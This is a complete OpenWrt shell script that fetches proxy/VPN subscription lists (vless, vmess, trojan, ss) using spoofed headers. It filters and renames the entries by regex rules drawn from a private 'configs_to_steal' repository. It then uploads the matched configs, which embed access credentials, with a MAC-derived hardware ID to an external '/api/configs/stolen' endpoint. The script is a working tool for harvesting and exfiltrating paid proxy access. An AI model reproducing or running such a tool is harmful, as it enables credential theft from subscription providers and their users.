#!/bin/sh
# =============================================================================
# Config Parser for OpenWrt (v3.0 - Grouped subscriptions with rules)
#
# Fetches JSON params from a URL. Each "subscription" is fetched ONCE,
# then a list of regex rules is applied to the decoded configs. Matched
# configs are collected (first-rule-wins) and sent to the API in a single
# POST request per subscription.
#
# JSON structure (see steal_params.example.json):
#   {
#     "global_headers": { "User-Agent": "...", "X-Ver-OS": "..." },
#     "subscriptions": [
#       {
#         "sub_url": "https://sub.example.com/abc",
#         "suffix": "DEVICE_A",
#         "headers": { "User-Agent": "override" },   # optional, merged over global
#         "rules": [
#           { "regex": "Обход белых списков", "name": "LTE Обход" },
#           { "regex": "(\\d+)\\s*UK", "name": "UK-\\1" }   # supports \1, \2
#         ]
#       }
#     ]
#   }
# =============================================================================

# -----------------------------------------------------------------------------
# Configuration (env vars preserved if set, CLI flags override)
# -----------------------------------------------------------------------------
: "${GITHUB_PARAMS_URL:=https://raw.githubusercontent.com/msgtv/configs_to_steal/refs/heads/main/steal_params.json}"
: "${GITHUB_TOKEN:=}"
: "${API_ENDPOINT:=https://admin.algacore.xyz/api/configs/stolen}"
: "${API_TOKEN:=}"

# Populated at runtime
PARAMS_FILE=""
SUBS_COUNT=0

# Temp directory (unique per run); tests can override
TMP_DIR="${TMP_DIR:-/tmp/config-parser-$$}"

# Per-subscription counters (set by apply_rules)
SUBSCR_TOTAL=0
SUBSCR_MATCHED=0

# Global summary counters
TOTAL_SUBS=0
SUCCESSFUL_SUBS=0
FAILED_SUBS=0
GRAND_TOTAL_CONFIGS=0
GRAND_MATCHED_CONFIGS=0

# -----------------------------------------------------------------------------
# Show help message
# -----------------------------------------------------------------------------
show_help() {
    cat << 'EOF'
Usage: config-parser.sh [OPTIONS]

Fetch subscription configs once per subscription, filter by regex rules
(with capture-group support), rename, and send to API.

Required:
  -t, --token <token>           Bearer token for API authorization
  -g, --github-token <token>    GitHub token for accessing params JSON

Options:
  -e, --endpoint <url>          API endpoint for sending configs
                                (default: https://admin.algacore.xyz/api/configs/stolen)
  -u, --params-url <url>        URL to params JSON
                                (default: hardcoded GitHub Raw URL)
  -h, --help                    Show this help message

Environment variables (fallback if CLI flags not provided):
  GITHUB_TOKEN, API_TOKEN, API_ENDPOINT, GITHUB_PARAMS_URL

JSON format (see steal_params.example.json):
  {
    "global_headers": { "Header-Name": "value" },
    "subscriptions": [
      {
        "sub_url": "https://sub.example.com/abc",
        "suffix": "UNIQUE_DEVICE_ID",
        "headers": { "Header-Name": "override" },
        "rules": [
          { "regex": "pattern", "name": "new name (supports \\1, \\2)" }
        ]
      }
    ]
  }

Exit codes:
  0 - all subscriptions processed successfully
  1 - at least one subscription failed (or fatal error)
EOF
}

# -----------------------------------------------------------------------------
# Parse command-line arguments
# -----------------------------------------------------------------------------
parse_args() {
    while [ $# -gt 0 ]; do
        case "$1" in
            -h|--help)
                show_help
                exit 0
                ;;
            -t|--token)
                API_TOKEN="$2"
                shift 2
                ;;
            -e|--endpoint)
                API_ENDPOINT="$2"
                shift 2
                ;;
            -g|--github-token)
                GITHUB_TOKEN="$2"
                shift 2
                ;;
            -u|--params-url)
                GITHUB_PARAMS_URL="$2"
                shift 2
                ;;
            --)
                shift
                break
                ;;
            -*)
                echo "[ERROR] Unknown option: $1" >&2
                echo "Use -h or --help for usage information." >&2
                exit 1
                ;;
            *)
                echo "[ERROR] Unexpected positional argument: $1" >&2
                echo "Use -h or --help for usage information." >&2
                exit 1
                ;;
        esac
    done

    # Validate required parameters
    if [ -z "$GITHUB_TOKEN" ]; then
        echo "[ERROR] GitHub token is required (-g, --github-token or GITHUB_TOKEN env)." >&2
        exit 1
    fi
    if [ -z "$API_TOKEN" ]; then
        echo "[ERROR] API token is required (-t, --token or API_TOKEN env)." >&2
        exit 1
    fi
}

# -----------------------------------------------------------------------------
# JSON helpers: jq primary, python3 fallback. All read from $PARAMS_FILE.
# Path format: jq-style, e.g. ".subscriptions[0].sub_url"
# -----------------------------------------------------------------------------

# Check that a JSON parser is available
_json_check() {
    if command -v jq >/dev/null 2>&1; then
        return 0
    elif command -v python3 >/dev/null 2>&1; then
        return 0
    fi
    echo "[ERROR] Neither jq nor python3 available for JSON parsing" >&2
    return 1
}

# Get the JSON type of the root element.
# stdout = "object" | "array" | "string" | "number" | "boolean" | "null"
json_type() {
    if command -v jq >/dev/null 2>&1; then
        jq -r "type" "$PARAMS_FILE" 2>/dev/null
    else
        python3 - "$PARAMS_FILE" << 'PYEOF'
import json, sys
d = json.load(open(sys.argv[1]))
if isinstance(d, dict):    print("object")
elif isinstance(d, list):  print("array")
elif isinstance(d, str):   print("string")
elif isinstance(d, bool):  print("boolean")
elif isinstance(d, (int, float)): print("number")
elif d is None:            print("null")
PYEOF
    fi
}

# Internal: resolve a jq-style path against root using regex tokenizer.
# $1 = path (e.g. ".subscriptions[0].sub_url" or ".global_headers[\"X-Test\"]")
# $2 = mode: "get" returns value, "len" returns array length (0 if not array)
_json_query() {
    _path="$1"
    _mode="$2"
    if command -v jq >/dev/null 2>&1; then
        if [ "$_mode" = "len" ]; then
            jq -r "${_path} | length" "$PARAMS_FILE" 2>/dev/null
        else
            jq -r "${_path} // empty" "$PARAMS_FILE" 2>/dev/null
        fi
    else
        python3 - "$PARAMS_FILE" "$_path" "$_mode" << 'PYEOF'
import json, sys, re
data = json.load(open(sys.argv[1]))
path = sys.argv[2]
mode = sys.argv[3]
# Tokenize jq-style path: .ident | ."quoted" | [digits] | ["quoted"]
tokens = re.findall(
    r'\.([A-Za-z_][\w-]*)|\.?"((?:[^"\\]|\\.)*)"|\[(\d+)\]|\["((?:[^"\\]|\\.)*)"\]',
    path
)
node = data
for ident, qstr1, num, qstr2 in tokens:
    if ident:
        node = node.get(ident) if isinstance(node, dict) else None
    elif qstr1:
        node = node.get(qstr1) if isinstance(node, dict) else None
    elif num:
        i = int(num)
        node = node[i] if isinstance(node, list) and i < len(node) else None
    elif qstr2:
        node = node.get(qstr2) if isinstance(node, dict) else None
    if node is None:
        break

if mode == "len":
    print(len(node) if isinstance(node, list) else 0)
else:
    if node is None or node == "":
        print("")
    elif isinstance(node, bool):
        print("true" if node else "false")
    elif isinstance(node, (dict, list)):
        print(json.dumps(node, ensure_ascii=False))
    else:
        print(node)
PYEOF
    fi
}

# Get value at jq-style path. Empty if missing.
# $1 = path (e.g. ".subscriptions[0].sub_url" or ".global_headers[\"X-Test\"]")
json_get() {
    _json_query "$1" "get"
}

# Get length of array at path. 0 if missing/not array.
# $1 = path (e.g. ".subscriptions" or ".subscriptions[0].rules")
json_len() {
    _json_query "$1" "len"
}

# Build merged headers as positional curl args: "-H" "Key: Value" ...
# Merge: start with global_headers, override with subscription.headers.
# $1 = subscription index
# Writes to stdout the args, one per line (for use with xargs).
# Lines starting with "HDR:" contain "Key: Value" already shell-escaped via @sh.
build_header_args() {
    _sub_idx="$1"
    if command -v jq >/dev/null 2>&1; then
        # Merge dicts with jq's `*`, then output each entry shell-quoted.
        # @sh is a filter (applied via |), not a function call.
        # Output per line: -H 'Key: Value'  (two args after eval)
        jq -r --argjson i "$_sub_idx" '
            (.global_headers // {}) * (.subscriptions[$i].headers // {}) |
            to_entries[] |
            ("-H " + ("\(.key): \(.value)" | @sh))
        ' "$PARAMS_FILE" 2>/dev/null
    else
        python3 - "$PARAMS_FILE" "$_sub_idx" << 'PYEOF'
import json, sys, shlex
d = json.load(open(sys.argv[1]))
i = int(sys.argv[2])
g = d.get("global_headers") or {}
subs = d.get("subscriptions") or []
s = subs[i].get("headers") if i < len(subs) else None
merged = dict(g)
if s:
    merged.update(s)
for k, v in merged.items():
    print(shlex.quote("-H") + " " + shlex.quote(f"{k}: {v}"))
PYEOF
    fi
}

# -----------------------------------------------------------------------------
# Get HWID: MD5 of MAC address (without colons, uppercase)
# -----------------------------------------------------------------------------
get_hwid() {
    _mac=""
    if [ -r /sys/class/net/br-lan/address ]; then
        _mac=$(tr -d ':' < /sys/class/net/br-lan/address 2>/dev/null)
    fi
    if [ -z "$_mac" ] && [ -r /sys/class/net/eth0/address ]; then
        _mac=$(tr -d ':' < /sys/class/net/eth0/address 2>/dev/null)
    fi
    if [ -z "$_mac" ]; then
        echo "UNKNOWN"
        return 1
    fi
    printf '%s' "$_mac" | md5sum | awk '{print toupper($1)}'
}

# Get HWID encoded in base64 (for fetch request header)
get_hwid_base64() {
    get_hwid | base64 | tr -d '\n'
}

# -----------------------------------------------------------------------------
# Fetch params JSON from GITHUB_PARAMS_URL into PARAMS_FILE.
# Populates PARAMS_FILE and SUBS_COUNT.
# Returns: 0 on success, 1 on failure
# -----------------------------------------------------------------------------
fetch_and_parse_params() {
    PARAMS_FILE="$TMP_DIR/params.json"

    echo "[INFO] Fetching params from: $GITHUB_PARAMS_URL"

    _http_code=$(curl -s -L --max-time 30 -w '%{http_code}' \
        -H "Authorization: Bearer $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github.raw" \
        "$GITHUB_PARAMS_URL" -o "$PARAMS_FILE" 2>/dev/null)

    if [ "$_http_code" != "200" ]; then
        echo "[ERROR] Failed to fetch params JSON (HTTP $_http_code)" >&2
        rm -f "$PARAMS_FILE"
        return 1
    fi

    if [ ! -s "$PARAMS_FILE" ]; then
        echo "[ERROR] Params JSON is empty (check GitHub token permissions)" >&2
        rm -f "$PARAMS_FILE"
        return 1
    fi

    _json_check || { rm -f "$PARAMS_FILE"; return 1; }

    # Validate structure: must be object with subscriptions array
    _is_obj=$(json_type)
    if [ "$_is_obj" != "object" ]; then
        echo "[ERROR] Invalid JSON: expected object with 'subscriptions' array" >&2
        rm -f "$PARAMS_FILE"
        return 1
    fi

    SUBS_COUNT=$(json_len ".subscriptions")
    if [ -z "$SUBS_COUNT" ] || [ "$SUBS_COUNT" -eq 0 ] 2>/dev/null; then
        echo "[ERROR] No subscriptions in params JSON" >&2
        rm -f "$PARAMS_FILE"
        return 1
    fi

    # Validate each subscription: must have sub_url (non-empty), suffix (non-empty), rules (array)
    _i=0
    while [ "$_i" -lt "$SUBS_COUNT" ]; do
        _su=$(json_get ".subscriptions[$_i].sub_url")
        _sf=$(json_get ".subscriptions[$_i].suffix")
        _rc=$(json_len ".subscriptions[$_i].rules")
        if [ -z "$_su" ] || [ -z "$_sf" ]; then
            echo "[ERROR] Subscription #$_i missing 'sub_url' or 'suffix'" >&2
            rm -f "$PARAMS_FILE"
            return 1
        fi
        if [ -z "$_rc" ] || [ "$_rc" -eq 0 ] 2>/dev/null; then
            echo "[ERROR] Subscription #$_i ($_su) has no rules" >&2
            rm -f "$PARAMS_FILE"
            return 1
        fi
        # Validate each rule
        _j=0
        while [ "$_j" -lt "$_rc" ]; do
            _rx=$(json_get ".subscriptions[$_i].rules[$_j].regex")
            _nm=$(json_get ".subscriptions[$_i].rules[$_j].name")
            if [ -z "$_rx" ] || [ -z "$_nm" ]; then
                echo "[ERROR] Subscription #$_i rule #$_j missing 'regex' or 'name'" >&2
                rm -f "$PARAMS_FILE"
                return 1
            fi
            _j=$((_j + 1))
        done
        _i=$((_i + 1))
    done

    echo "[INFO] Loaded $SUBS_COUNT subscription(s)"
    return 0
}

# -----------------------------------------------------------------------------
# Check if content is base64 encoded.
# Stricter than v2: minimum length 32, single block, decodable.
# $1 = content string
# Returns: 0 if base64, 1 otherwise
# -----------------------------------------------------------------------------
is_base64() {
    _content="$1"

    # Multi-line content (typical for raw config lists) is NOT single base64 blob.
    # Use literal newline (POSIX, no $'\n' bashism).
    _NL='
'
    case "$_content" in
        *"$_NL"*) return 1 ;;
    esac

    # Quick reject: typical proxy URL characters
    case "$_content" in
        *'://'*|*'@'*) return 1 ;;
    esac

    # Base64 alphabet only, length multiple of 4, min 16 chars
    _len=${#_content}
    if [ "$_len" -lt 16 ]; then
        return 1
    fi
    if [ $((_len % 4)) -ne 0 ]; then
        return 1
    fi
    if ! printf '%s' "$_content" | grep -qE '^[A-Za-z0-9+/]+={0,2}$'; then
        return 1
    fi

    # Final check: try to decode and verify output looks like config text
    if printf '%s' "$_content" | base64 -d 2>/dev/null | grep -qE '://|vmess://|trojan://|ss://|vless://|#'; then
        return 0
    fi
    return 1
}

# -----------------------------------------------------------------------------
# Decode base64 file content into $TMP_DIR/decoded.txt
# $1 = input file path
# Returns: 0 on success, 1 on failure
# -----------------------------------------------------------------------------
decode_base64_file() {
    _in="$1"
    _out="$TMP_DIR/decoded.txt"
    if base64 -d "$_in" > "$_out" 2>/dev/null && [ -s "$_out" ]; then
        return 0
    fi
    rm -f "$_out"
    return 1
}

# -----------------------------------------------------------------------------
# URL-decode a string (POSIX sh, no sed hacks).
# $1 = URL-encoded string
# stdout = decoded string
# -----------------------------------------------------------------------------
url_decode() {
    _enc="$1"
    _result=""
    _i=0
    _len=${#_enc}
    while [ "$_i" -lt "$_len" ]; do
        _c="${_enc:$_i:1}"
        case "$_c" in
            +)
                _result="${_result} "
                _i=$((_i + 1))
                ;;
            %)
                _hex="${_enc:$((_i + 1)):2}"
                case "$_hex" in
                    [0-9A-Fa-f][0-9A-Fa-f])
                        _result="${_result}$(printf "\\x$_hex")"
                        _i=$((_i + 3))
                        ;;
                    *)
                        _result="${_result}$_c"
                        _i=$((_i + 1))
                        ;;
                esac
                ;;
            *)
                _result="${_result}$_c"
                _i=$((_i + 1))
                ;;
        esac
    done
    printf '%s' "$_result"
}

# -----------------------------------------------------------------------------
# URL-encode a string (POSIX sh via printf per char).
# $1 = string to encode
# stdout = URL-encoded string
# -----------------------------------------------------------------------------
url_encode() {
    _str="$1"
    _result=""
    _i=0
    _len=${#_str}
    while [ "$_i" -lt "$_len" ]; do
        _c="${_str:$_i:1}"
        case "$_c" in
            [a-zA-Z0-9.~_-])
                _result="${_result}${_c}"
                ;;
            *)
                # ord via printf '%d' "'X" — works in ash and bash
                _ord=$(printf '%d' "'$_c")
                _result="${_result}$(printf '%%%02X' "$_ord")"
                ;;
        esac
        _i=$((_i + 1))
    done
    printf '%s' "$_result"
}

# -----------------------------------------------------------------------------
# Fetch subscription config from URL with merged headers.
# $1 = sub_url, $2 = subscription index (for header lookup)
# Writes raw response to $TMP_DIR/raw.txt
# Returns: 0 on success, 1 on failure
# -----------------------------------------------------------------------------
fetch_config() {
    _sub_url="$1"
    _sub_idx="$2"

    echo "[INFO] Fetching config from: $_sub_url"

    # Build header args from merged global + subscription headers.
    # Join multi-line jq output with spaces (eval treats newlines as command separators).
    _hdr_args=$(build_header_args "$_sub_idx" | tr '\n' ' ')

    # Use eval to properly split quoted args ("-H" "Key: Value" ...)
    # hdr_args is produced by jq @sh or python shlex.quote — safe quoting.
    # shellcheck disable=SC2086
    if [ -n "$_hdr_args" ]; then
        # shellcheck disable=SC2086
        eval "set -- $_hdr_args"
        curl -s -L --max-time 30 "$@" "$_sub_url" > "$TMP_DIR/raw.txt" 2>/dev/null
    else
        curl -s -L --max-time 30 "$_sub_url" > "$TMP_DIR/raw.txt" 2>/dev/null
    fi

    if [ -s "$TMP_DIR/raw.txt" ]; then
        echo "[INFO] Config fetched successfully"
        return 0
    fi
    echo "[ERROR] Failed to fetch config (empty response or network error)" >&2
    return 1
}

# -----------------------------------------------------------------------------
# Decode raw.txt if base64, otherwise copy as-is.
# Writes result to $TMP_DIR/decoded.txt
# Returns: 0 on success, 1 on failure
# -----------------------------------------------------------------------------
decode_content() {
    _content=""
    if [ -r "$TMP_DIR/raw.txt" ]; then
        _content=$(cat "$TMP_DIR/raw.txt")
    fi

    if is_base64 "$_content"; then
        echo "[INFO] Content is base64 encoded, decoding..."
        if decode_base64_file "$TMP_DIR/raw.txt"; then
            echo "[INFO] Base64 decoded successfully"
            return 0
        fi
        echo "[ERROR] Base64 decoding failed" >&2
        return 1
    fi

    echo "[INFO] Content is plain text, using as-is"
    cp "$TMP_DIR/raw.txt" "$TMP_DIR/decoded.txt"
    return 0
}

# -----------------------------------------------------------------------------
# Apply regex-based rename to a single name (supports \1, \2 capture groups).
# $1 = decoded name, $2 = regex (POSIX ERE, case-SENSITIVE), $3 = rename template
# stdout = renamed name (or original on failure)
# Note: case-insensitivity is NOT portable across busybox sed versions.
#       Provide multiple rule variants in steal_params.json for case coverage.
# -----------------------------------------------------------------------------
apply_rename() {
    _decoded="$1"
    _regex="$2"
    _rename="$3"

    # Use | as sed separator (rare in proxy names).
    # Escape only | (separator) in regex; backslashes are part of regex syntax.
    # Escape | and & in rename (& is literal char per server re.sub semantics).
    # Do NOT escape backslashes in rename — they are part of \1, \2 backreferences.
    _esc_regex=$(printf '%s' "$_regex" | sed 's,[|],\\&,g')
    _esc_rename=$(printf '%s' "$_rename" | sed 's,[|&],\\&,g')

    # Try sed with -E (POSIX ERE). Capture groups via \1, \2, ... in rename.
    _result=$(printf '%s' "$_decoded" | sed -E "s|${_esc_regex}|${_esc_rename}|g" 2>/dev/null)
    if [ -n "$_result" ]; then
        printf '%s' "$_result"
        return 0
    fi

    # Last resort: return original unchanged
    printf '%s' "$_decoded"
}

# -----------------------------------------------------------------------------
# Apply all rules to decoded.txt. First-rule-wins per config line.
# $1 = subscription index
# Writes matched (renamed) configs to $TMP_DIR/filtered.txt
# Sets: SUBSCR_TOTAL, SUBSCR_MATCHED
# -----------------------------------------------------------------------------
apply_rules() {
    _sub_idx="$1"
    _rules_count=$(json_len ".subscriptions[$_sub_idx].rules")

    : > "$TMP_DIR/filtered.txt"
    : > "$TMP_DIR/filtered_names.txt"
    : > "$TMP_DIR/no_match.txt"

    _total=0
    _matched=0

    while IFS= read -r _line || [ -n "$_line" ]; do
        [ -z "$_line" ] && continue
        _total=$((_total + 1))

        case "$_line" in
            *'#'*)
                _url_part="${_line%%#*}"
                _name="${_line##*#}"
                _decoded_name=$(url_decode "$_name")

                _rule_i=0
                _matched_rule=-1
                while [ "$_rule_i" -lt "$_rules_count" ]; do
                    _regex=$(json_get ".subscriptions[$_sub_idx].rules[$_rule_i].regex")
                    if printf '%s' "$_decoded_name" | grep -qiE "$_regex" 2>/dev/null; then
                        _matched_rule=$_rule_i
                        break
                    fi
                    _rule_i=$((_rule_i + 1))
                done

                if [ "$_matched_rule" -ge 0 ]; then
                    _rx=$(json_get ".subscriptions[$_sub_idx].rules[$_matched_rule].regex")
                    _nm=$(json_get ".subscriptions[$_sub_idx].rules[$_matched_rule].name")
                    _renamed=$(apply_rename "$_decoded_name" "$_rx" "$_nm")
                    _encoded=$(url_encode "$_renamed")
                    printf '%s#%s\n' "$_url_part" "$_encoded" >> "$TMP_DIR/filtered.txt"
                    printf '%s\n' "$_renamed" >> "$TMP_DIR/filtered_names.txt"
                    _matched=$((_matched + 1))
                else
                    printf '%s\n' "$_decoded_name" >> "$TMP_DIR/no_match.txt"
                fi
                ;;
            *)
                # Lines without # — counted but skipped
                ;;
        esac
    done < "$TMP_DIR/decoded.txt"

    SUBSCR_TOTAL=$_total
    SUBSCR_MATCHED=$_matched

    echo "[INFO] Rules applied: $_total total, $_matched matched"
}

# -----------------------------------------------------------------------------
# Send filtered configs to API endpoint.
# $1 = HWID suffix
# Returns: 0 on success, 1 on failure
# -----------------------------------------------------------------------------
send_configs() {
    _suffix="$1"

    if [ ! -s "$TMP_DIR/filtered.txt" ]; then
        echo "[WARN] No configs to send"
        return 1
    fi

    _hwid=$(get_hwid)
    _hwid_with_suffix="${_hwid}_${_suffix}"

    echo "[INFO] Sending $SUBSCR_MATCHED configs to: $API_ENDPOINT (x-hwid: $_hwid_with_suffix)"

    _response=$(curl -s -w "\n%{http_code}" -X POST --max-time 30 \
        -H "Content-Type: text/plain" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "x-hwid: $_hwid_with_suffix" \
        --data-binary "@$TMP_DIR/filtered.txt" \
        "$API_ENDPOINT" 2>/dev/null)

    _http_code=$(printf '%s' "$_response" | tail -n1)
    _body=$(printf '%s' "$_response" | sed '$d')

    case "$_http_code" in
        200|201)
            echo "[INFO] Successfully sent configs (HTTP $_http_code)"
            return 0
            ;;
        *)
            echo "[ERROR] Failed to send configs (HTTP $_http_code)" >&2
            echo "[ERROR] Response: $_body" >&2
            return 1
            ;;
    esac
}

# -----------------------------------------------------------------------------
# Generate report for a single subscription.
# $1 = subscription number (1-based), $2 = sub_url, $3 = suffix
# -----------------------------------------------------------------------------
generate_subscription_report() {
    _num="$1"
    _sub_url="$2"
    _suffix="$3"
    _not_matched=$((SUBSCR_TOTAL - SUBSCR_MATCHED))

    echo ""
    echo "============================================"
    echo "       SUBSCRIPTION #$_num REPORT"
    echo "============================================"
    echo "  URL:          $_sub_url"
    echo "  Suffix:       $_suffix"
    echo "  Total:        $SUBSCR_TOTAL"
    echo "  Matched:      $SUBSCR_MATCHED"
    echo "  Not matched:  $_not_matched"
    echo "============================================"

    if [ -s "$TMP_DIR/filtered_names.txt" ]; then
        echo ""
        echo "  Matched configs:"
        while IFS= read -r _n; do
            echo "    - $_n"
        done < "$TMP_DIR/filtered_names.txt"
    fi

    if [ -s "$TMP_DIR/no_match.txt" ]; then
        echo ""
        echo "  Not matched:"
        while IFS= read -r _n; do
            echo "    - $_n"
        done < "$TMP_DIR/no_match.txt"
    fi
    echo ""
}

# -----------------------------------------------------------------------------
# Print overall summary
# -----------------------------------------------------------------------------
print_summary() {
    echo ""
    echo "============================================"
    echo "              OVERALL SUMMARY"
    echo "============================================"
    echo "  Subscriptions processed: $TOTAL_SUBS"
    echo "  Successful:              $SUCCESSFUL_SUBS"
    echo "  Failed:                  $FAILED_SUBS"
    echo "  Total configs seen:      $GRAND_TOTAL_CONFIGS"
    echo "  Total matched:           $GRAND_MATCHED_CONFIGS"
    echo "============================================"
    echo ""
}

# -----------------------------------------------------------------------------
# Cleanup temp files
# -----------------------------------------------------------------------------
cleanup() {
    if [ -n "$TMP_DIR" ] && [ -d "$TMP_DIR" ]; then
        rm -rf "$TMP_DIR" 2>/dev/null
    fi
}

# -----------------------------------------------------------------------------
# Main function
# -----------------------------------------------------------------------------
main() {
    parse_args "$@"

    echo "============================================"
    echo "       OpenWrt Config Parser v3.0"
    echo "============================================"
    echo ""
    echo "[INFO] Params URL:  $GITHUB_PARAMS_URL"
    echo "[INFO] API endpoint: $API_ENDPOINT"
    echo ""

    # Create temp directory and register cleanup
    mkdir -p "$TMP_DIR" || { echo "[FATAL] Cannot create $TMP_DIR" >&2; exit 1; }
    trap cleanup EXIT INT TERM

    # Step 1: Fetch and validate params JSON
    if ! fetch_and_parse_params; then
        echo "[FATAL] Cannot proceed without params" >&2
        exit 1
    fi

    echo ""
    echo "Processing $SUBS_COUNT subscription(s)..."
    echo ""

    # Step 2: Loop through each subscription
    _s=0
    while [ "$_s" -lt "$SUBS_COUNT" ]; do
        _num=$((_s + 1))
        TOTAL_SUBS=$((TOTAL_SUBS + 1))

        _sub_url=$(json_get ".subscriptions[$_s].sub_url")
        _suffix=$(json_get ".subscriptions[$_s].suffix")
        _rules_count=$(json_len ".subscriptions[$_s].rules")

        echo "============================================"
        echo "       PROCESSING SUBSCRIPTION #$_num"
        echo "============================================"
        echo "[INFO] URL:    $_sub_url"
        echo "[INFO] Suffix: $_suffix"
        echo "[INFO] Rules:  $_rules_count"
        echo ""

        _sub_success=true

        # Step 2a: Fetch config (single fetch per subscription)
        if ! fetch_config "$_sub_url" "$_s"; then
            echo "[ERROR] Subscription #$_num failed at fetch step" >&2
            _sub_success=false
        fi

        # Step 2b: Decode
        if [ "$_sub_success" = true ] && ! decode_content; then
            echo "[ERROR] Subscription #$_num failed at decode step" >&2
            _sub_success=false
        fi

        # Step 2c: Apply all rules (first-rule-wins)
        if [ "$_sub_success" = true ]; then
            apply_rules "$_s"
        else
            SUBSCR_TOTAL=0
            SUBSCR_MATCHED=0
        fi

        # Step 2d: Send to API (one POST per subscription)
        if [ "$_sub_success" = true ]; then
            if ! send_configs "$_suffix"; then
                echo "[WARN] Subscription #$_num: nothing to send (or send failed)" >&2
                # Empty result is not fatal
            fi
        fi

        # Step 2e: Report
        generate_subscription_report "$_num" "$_sub_url" "$_suffix"

        # Update counters
        if [ "$_sub_success" = true ]; then
            SUCCESSFUL_SUBS=$((SUCCESSFUL_SUBS + 1))
        else
            FAILED_SUBS=$((FAILED_SUBS + 1))
        fi
        GRAND_TOTAL_CONFIGS=$((GRAND_TOTAL_CONFIGS + SUBSCR_TOTAL))
        GRAND_MATCHED_CONFIGS=$((GRAND_MATCHED_CONFIGS + SUBSCR_MATCHED))

        # Reset per-sub counters
        SUBSCR_TOTAL=0
        SUBSCR_MATCHED=0

        _s=$((_s + 1))
    done

    # Step 3: Summary
    print_summary

    [ "$FAILED_SUBS" -gt 0 ] && exit 1
    exit 0
}

# -----------------------------------------------------------------------------
# Source-guard: only run main when executed, not when sourced for tests.
# Tests do: CONFIG_PARSER_LIB=1 . ./config-parser.sh
# -----------------------------------------------------------------------------
if [ "${CONFIG_PARSER_LIB:-0}" != "1" ]; then
    main "$@"
fi
